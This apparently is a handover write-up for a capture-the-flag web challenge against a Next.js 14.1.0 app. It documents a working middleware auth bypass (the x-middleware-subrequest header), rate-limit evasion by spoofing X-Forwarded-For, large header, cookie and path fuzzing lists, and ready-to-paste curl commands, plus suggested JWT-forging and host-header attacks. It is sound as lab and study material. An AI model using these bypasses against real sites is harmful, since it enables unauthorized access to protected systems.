# SecureBoard / "Lazarus" — Recon & Exploitation Walkthrough (handover)

Target: `http://laz.136.82.117.70.nip.io/` (challenge "Lazarus", Web, 999 pts, author Aakarsh Mishra)  
Status at handover: **middleware bypass confirmed, flag not yet retrieved.**

Everything below was executed from the WorkBuddy sandbox. The sandbox reaches the target directly  
through its HTTP proxy (`$http_proxy`, currently `127.0.0.1:8067`) — **no SOCKS pivot / WSL needed**,  
unlike the usual HTB/THM lab setup.

---

## 1. TL;DR — the state of play

| Item                      | Result                                                                                                                     |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| Framework                 | Next.js **14.1.0** (React 18.2.0), **Pages Router**, `buildId = LfjXUfoCALzAuDhbVo_la`                                     |
| Pages                     | `/`, `/403`, `/dashboard` only (from `_buildManifest.js`)                                                                  |
| API                       | `GET /api/admin/live`                                                                                                      |
| Flag endpoint             | Yes — the API returns `{"source":"cache","variant":"default","data":{"message":"Access denied. Admin only.","flag":null}}` |
| Middleware                | Guards `/admin*` (307 → `/403`), rate-limits by `X-Forwarded-For`                                                          |
| **CVE-2025-29927 bypass** | **WORKS** — `x-middleware-subrequest: middleware` (a *single* occurrence is enough) turns `/admin` 307 → 404               |
| Rate-limit bypass         | **WORKS** — spoof `X-Forwarded-For` with a random IP per request                                                           |
| `x-nextjs-data: 1`        | Changes middleware redirect to `x-nextjs-redirect` (CVE-2026-44572 behaviour)                                              |
| `variant` → `admin`       | **NOT achieved.** This is the blocker.                                                                                     |

**The single unsolved question:** *what makes the API return `variant: "admin"` (and thus the flag)?*  
The API response is byte-identical with and without the middleware bypass, so the middleware does **not**  
set that value — the API route computes it from something we haven't found yet.

---

## 2. Recon — what the app actually is

### Root page (`/`)

Static Next.js page, "SecureBoard v2.1 — Internal Operations Portal". Nav links to `/dashboard` and  
`/api/admin/live`. Contains fake "Recent Activity" and project stats. Notable flavour text that is  
almost certainly a hint:

- Recent activity: **`admin` — updated middleware config for edge handlers**
- Project list includes: **"Edge Middleware Audit"** (owner `admin`), "Auth Service v2"

The challenge description maps onto this: *"the ward they once failed to hold"* = a past middleware  
auth bypass (CVE-2025-29927), *"the iron they hath since laid across that door"* = their fix,  
*"patched, sealed, mended"* = the fix is claimed complete.

### `/dashboard`

`getServerSideProps` page. Data route `/_next/data/<buildId>/dashboard.json` returns:

```json
{"pageProps":{"data":{"user":"r.sharma","projects":[
  {"name":"API Gateway Refactor","status":"In Progress","owner":"r.sharma","due":"2026-10-15","priority":"High"},
  {"name":"Auth Service v2","status":"In Progress","owner":"p.anand","due":"2026-10-28","priority":"High"},
  {"name":"Dashboard UI Revamp","status":"In Progress","owner":"k.mehta","due":"2026-11-01","priority":"Medium"},
  {"name":"Log Aggregation Pipeline","status":"Done","owner":"deploy-bot","due":"2026-09-30","priority":"Low"},
  {"name":"Edge Middleware Audit","status":"In Progress","owner":"admin","due":"2026-10-20","priority":"High"}]}},
  "__N_SSP":true}
```

No token, no cookie, nothing useful beyond the hint text. This is the "common hall".

### Assets pulled down (in `recon/`)

`polyfills-*.js`, `webpack-*.js`, `framework-*.js` (140 KB), `main-*.js` (109 KB),  
`pages/_app-*.js`, `pages/index-*.js`, `pages/dashboard-*.js`, `pages/403-*.js`, `pages/_error-*.js`,  
`_buildManifest.js`, `_ssgManifest.js`. Grepped for `flag|HTB{|secret|token|jwt|eyJ|variant|cookie` —  
**only Next.js/React internals** ("font-variant", "x-middleware-*" router internals). No leak.

### Endpoint enumeration

- `/login`, `/admin`, `/api`, `/api/admin`, `/changelog`, `/security.txt`, `/robots.txt`,  
  `/sitemap.xml`, `/README`, `/.git/*`, `/.env`, `/middleware.ts`, `/package.json`,  
  `/.next/server/middleware.js`, `/next.config.js`, backup extensions, `assetPrefix` guesses  
  (`/cdn/_next/...`, `/static/_next/...`) → **all 404**.
- A 3 371-path wordlist scan (with the bypass) found **only `/dashboard`**.
- `/admin/<anything>` → 307 (middleware blanket-guards the whole subtree); with the bypass → 404.
- **`/api/admin/live` is the only API route.** `/api/admin/nope` → real Next.js routing 404 (so  
  `live` is a *static* route, not a dynamic one).

---

## 3. The middleware — characterised

Response headers of interest:

```
server-timing: edge;dur=12        <- edge function runs on /api/admin/live
x-cache: HIT                      <- CDN cached
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch
```

Every other path lacks `server-timing: edge`, so the API is served by an edge handler.

### Behaviour matrix (verbatim results)

| Request                                              | Status  | Notes                                                                        |
| ---------------------------------------------------- | ------- | ---------------------------------------------------------------------------- |
| `GET /admin`                                         | 307     | `location: /403`                                                             |
| `GET /admin` + `x-middleware-subrequest: middleware` | **404** | middleware **skipped**                                                       |
| `GET /admin` + `x-nextjs-data: 1`                    | 307     | `x-nextjs-redirect: /403`, no `Location`                                     |
| `GET /admin` + `x-nextjs-data: 1` + bypass           | **200** | `content-type: application/json`, `x-nextjs-matched-path: /admin`, body `{}` |
| `GET /api/admin/live`                                | 200     | the "Access denied" JSON                                                     |
| `GET /api/admin/live` + bypass                       | 200     | **byte-identical** response, identical headers                               |
| `GET /api/admin/nope`                                | 404     | real routing 404                                                             |

### Bypass payloads that work vs. don't (on `/admin`, oracle = 307→404)

```
WORKS:  x-middleware-subrequest: middleware                    (single!)
WORKS:  x-middleware-subrequest: middleware:...(x2..x6)
FAILS:  x-middleware-subrequest: src/middleware...             (still 307)
FAILS:  x-middleware-subrequest: pages/_middleware...
FAILS:  x-middleware-subrequest: app/middleware...
```

→ The middleware file is at the **project root, named `middleware`**, and the runtime's skip check is  
a plain `.includes()` (not the 5×-repetition depth check). This is the "incomplete patch" the blurb  
alludes to.

### Rate limiter (two layers)

- **Edge layer** → plain-text `429 Rate exceeded.` (14 bytes, `text/html`).
- **App layer** → JSON `{"source":"rate-limit","variant":"default","data":{"message":"Too many requests."}}`.
- Triggered after ~7 rapid requests from one IP.
- **`X-Forwarded-For` controls the bucket** → a random XFF per request completely bypasses it  
  (verified: `XFF 1.2.3.4` → 200 while our real IP was 429'd).
- `XFF: 127.0.0.1` is consistently rate-limited (its bucket appears to be exhausted/shared).

---

## 4. What I tested that did NOT work (so you don't repeat it)

All of these were tried **against `/api/admin/live`**, both **with and without** the  
`x-middleware-subrequest: middleware` bypass header, and **with random `X-Forwarded-For`** to dodge  
the rate limiter. None changed `variant` from `default` or populated `flag`.

**Header names fuzzed (~2 000 candidates):** `x-variant`, `variant`, `x-source`, `source`, `role`,  
`x-role`, `user`, `x-user`, `x-user-role`, `admin`, `x-admin`, `is-admin`, `isadmin`, `level`, `access`,  
`scope`, `type`, `mode`, `view`, `tier`, `plan`, `tenant`, `privilege`, `trust`, `internal`, `staff`,  
`superuser`, `root`, `canary`, `beta`, `preview`, `debug`, `env`, `ab`, `experiment`, `bucket`,  
`cohort`, `impersonate`, `runas`, `sudo`, `elevate`, `audience`, `principal`, `claims`, `cache*`,  
`origin`, `upstream`, `backend`, `mirror`, `ledger`, `board`, `keys`, `key`, `token`, `session`, `auth`,  
`authorization`, … plus every combination of prefixes `x-`, `x-sb-`, `x-secureboard-`, `x-board-`,  
`x-admin-`, `x-internal-`, `x-user-`, `x-auth-`, `x-app-`, `x-edge-`, `x-mw-`, `x-cdn-`, `x-origin-`,  
`x-upstream-`, `x-backend-`, `x-request-`, `x-client-`, `x-server-`, `x-custom-`, `x-cache-`,  
`x-forwarded-`, `x-trusted-`, `x-verified-`, `x-signed-`, `x-jwt-`, `x-hall-`, `x-gate-`, `x-key-`,  
`x-flag-`, `x-secure-`, `x-private-`, `x-staff-`, `x-ops-` × ~35 suffixes. Values `admin`, `true`, `1`,  
`yes`, `internal`, `secureboard`, `administrator`, `root`, `superadmin`, `on`.

**Cookie names fuzzed (~150):** `session`, `token`, `auth`, `role`, `user`, `admin`, `isAdmin`,  
`variant`, `sb_session`, `secureboard`, `sb`, `jwt`, `access_token`, `uid`, `username`, `logged_in`,  
`authorized`, `admin_session`, `next-auth.session-token`, `__session`, `connect.sid`, `PHPSESSID`,  
`_session`, `sid`, `user_role`, `privilege`, `scope`, `key`, `apikey`, `secret`, `staff`, `superuser`,  
`tenant`, `plan`, `tier`, `internal`, `edge`, `middleware`, … (values `admin`/`true`/`1`/`yes`/`internal`).

**Query params fuzzed:** `variant`, `role`, `user`, `admin`, `source`, `src`, `mode`, `view`, `type`,  
`scope`, `access`, `level`, `internal`, `debug`, `as`, `runas`, `impersonate`, `view-as`, `preview`,  
`canary`, `beta`, `v`, `ver`, `version`, `env`, `tenant`, `cb` (cache-buster).

**Also tried and failed:**

- `x-middleware-override-headers: x-variant` + `x-middleware-request-x-variant: admin` (with & without bypass); same for `role`, `x-user-role`, `x-middleware-subrequest`.
- Sending `x-middleware-subrequest` with values `admin`, `x`, `default`, `internal`, `true`, `1`, `Admin`, `ADMIN`, `none`, `""`, `admin:admin`, `a:b:c`, `middleware:admin`, `admin:middleware` (values without `middleware` do **not** trigger the skip, so the middleware runs — and still denies).
- **Duplicate / malformed headers via raw sockets:** two `x-middleware-subrequest` headers (both orders), two `X-Forwarded-For` headers, `X-Middleware-Subrequest` casing, tab-valued, `obs-fold` (space before colon → 400 from GFE).
- **`x-nextjs-data: 1`** on the API (alone and with bypass) — no change.
- **Host / X-Forwarded-Host:** `localhost`, `127.0.0.1:3000`, `admin.laz.…`, `internal.laz.…`, `app`, `prod`, `staging`, `dev`, `[::1]`, `0.0.0.0`.
- **X-Forwarded-For / X-Real-IP / True-Client-IP / CF-Connecting-IP / Forwarded** with internal values: `127.0.0.1`, `127.0.0.2`, `::1`, `0.0.0.0`, `10.0.0.1`, `192.168.1.1`, `172.16.0.1`, `136.82.117.70` (the target's own IP), comma-chains.
- **User-Agent** (`Next.js`, `curl/8.0`, `admin-bot`, `internal-monitor/1.0`), **Referer/Origin** (localhost, 127.0.0.1, internal, `/admin`), **X-Requested-With**, **Accept** variants, **RSC / Next-Router-Prefetch / Next-Router-State-Tree** headers.
- **Cache busting:** `Cache-Control: no-cache|no-store|max-age=0`, `Pragma: no-cache`, `?cb=<random>` — `source` stayed `cache`.
- **HTTP methods:** `OPTIONS/POST/PUT/DELETE/PATCH/HEAD` — all return the same JSON.
- **Path tricks:** `/api/admin/live/`, `/api/admin/live/.`, `%6cive`, `//live`, `/api//admin/live`, `/API/ADMIN/LIVE`, `..;/`, `.json`, `.txt`, `%00`, trailing space, semicolon.
- **`.rsc` / segment-prefetch paths** (`/api/admin/live.rsc`, `/api/admin/live.segments/$c$children/__PAGE__.segment.rsc`, `/admin.rsc`, `/dashboard.rsc`, `/index.rsc`) → 404. No i18n configured either (`Accept-Language: fr` does not redirect; `/en/dashboard` → 404), so **CVE-2026-44573 does not apply**.
- **`assetPrefix`** data routes (`/cdn/_next/data/<buildId>/admin.json`, `/static/…`, `/assets/…`, `/public/…`, `/v2/…`) → 404.
- **Admin data-route fuzz:** `/admin/<word>` and `/_next/data/<buildId>/admin/<word>.json` with `x-nextjs-data: 1` + bypass across ~70 page names → all return `{}` (never non-empty).
- **Search:** no writeup/source found online for this challenge; author's GitHub (`AakarshMishra`) has nothing matching; no source maps, no `.git`, no config leaks.

---

## 5. Relevant CVEs I identified (for the next step)

The target is **Next.js 14.1.0**, which is affected by *all* of these; the app appears to have applied  
**middleware-level mitigations**, not a version upgrade.

| CVE                | What it is                                                                                                                                                                                           | Applicable here?                                                                                                                                    |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CVE-2025-29927** | Middleware auth bypass via `x-middleware-subrequest`                                                                                                                                                 | **Yes — confirmed working**                                                                                                                         |
| **CVE-2026-44572** | Middleware/proxy redirects cache-poisoned via `x-nextjs-data`                                                                                                                                        | **Yes — confirmed** (redirect becomes `x-nextjs-redirect`)                                                                                          |
| CVE-2026-44573     | Pages Router i18n: locale-less `/_next/data/<buildId>/<page>.json` bypasses middleware                                                                                                               | No — app has no `i18n` config                                                                                                                       |
| **CVE-2026-44574** | Middleware/proxy bypass via **dynamic route parameter injection** ("specially crafted query parameters can alter the dynamic route value seen by the page while leaving the visible path unchanged") | **Advisory says 15.4.0+**, so officially N/A on 14.1.0 — **but worth probing**, since the app may still be built to be vulnerable to the same class |
| CVE-2026-44575     | App Router segment-prefetch URL bypass                                                                                                                                                               | No — Pages Router, and `.rsc` paths 404                                                                                                             |
| CVE-2026-64645     | SSRF in `rewrites()`/`redirects()` when the destination hostname is request-controlled                                                                                                               | Untested — worth checking if the app has a host-based rewrite                                                                                       |

---

## 6. Where I'd go next (concrete ideas, ranked)

1. **Find the `variant` input.** The API response is identical with/without the middleware bypass, so  
   the API route computes `variant` itself. Since header/cookie/query fuzzing failed, the likely  
   remaining candidates are:
   - a **signed JWT** (the blurb's *"Thou art given the keys to the common hall"* smells like a token  
     you're supposed to obtain/forge). Look for a `Set-Cookie` on a path I didn't hit, or a token  
     issued by an endpoint; then attack it with the `jwt-attacks` skill (weak HMAC, `alg:none`,  
     algorithm confusion).
   - a header the **edge/CDN** adds (not client-controllable) — i.e. the flag may only be reachable by  
     making the *middleware* run and inject it. That loops back to: **what makes the middleware treat  
     a request as admin?**
2. **Re-test the middleware admin check with the `/admin` oracle** (`307` vs not) rather than the API,  
   since `/admin` is a clean boolean oracle. I fuzzed ~200 header/cookie names there and found nothing,  
   but I did **not** systematically fuzz `Accept-Language`, `Sec-Fetch-*`, `Authorization` schemes  
   (Basic/Bearer/Digest), or JWT-shaped cookie values.
3. **Try `Authorization: Bearer <forged JWT>`** with common weak secrets (`secret`, `secureboard`,  
   `lazarus`, `admin`, `changeme`) and claims `{"role":"admin"}` / `{"isAdmin":true}`.
4. **Probe CVE-2026-44574-style dynamic-route parameter injection** even though 14.1.0 is nominally  
   out of range — try query encodings that could alter the route param the API route sees, e.g.  
   `?__nextDefaultLocale=`, `?nxtPpath=`, duplicated/encoded `?live=admin`, `%2f`-encoded segments,  
   and `?`+`;` combos on `/api/admin/live`.
5. **Look harder for a "dead" (Lazarus) route.** The name suggests something removed-but-still-live.  
   Consider `/_next/data/<buildId>/` with the *old* build id, `/api/admin/live` with a legacy  
   `Accept: application/json` + `?_nextDataReq=1`, or a sibling API that only appears when the  
   middleware rewrites. Also worth: `POST` with a JSON body (`{"variant":"admin"}`, `{"role":"admin"}`,  
   `{"key":"..."}`) — I only tested bodyless POST/PUT/DELETE/PATCH.
6. **Check for a host-controlled rewrite (CVE-2026-64645).** Try `Host: <attacker>` / a  
   `X-Forwarded-Host` that changes the rewrite destination to an internal host, and try  
   `/api/mirror/<host>/<path>`-style paths (the blurb says *"a mirror of progress"* — mirror/proxy  
   wording may be literal).

---

## 7. Copy-paste building blocks

```bash
B=http://laz.136.82.117.70.nip.io

# baseline (note the flag field)
curl -s "$B/api/admin/live"

# middleware bypass proof on /admin  (307 -> 404)
curl -s -o /dev/null -w '%{http_code}\n' "$B/admin"
curl -s -o /dev/null -w '%{http_code}\n' -H 'x-middleware-subrequest: middleware' "$B/admin"

# x-nextjs-data behaviour (307 + x-nextjs-redirect instead of Location)
curl -si -H 'x-nextjs-data: 1' "$B/admin" | grep -iE 'HTTP/|x-nextjs-redirect|location'

# /admin as a data request with the middleware skipped -> 200 {} , x-nextjs-matched-path: /admin
curl -si -H 'x-middleware-subrequest: middleware' -H 'x-nextjs-data: 1' "$B/admin"

# dodge the rate limiter with a random XFF while fuzzing
curl -s -H "x-forwarded-for: $((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))" "$B/api/admin/live"
```

Build id / page list for reference:

```
buildId           = LfjXUfoCALzAuDhbVo_la
pages             = / , /403 , /_error , /dashboard
data routes       = /_next/data/LfjXUfoCALzAuDhbVo_la/{dashboard,index,admin,403}.json
```

Scratch scripts from this session are in `lazarus/` (`fuzz_*.py`, `scan.py`, `rawtest.py`, …) and the  
downloaded assets in `lazarus/recon/`.


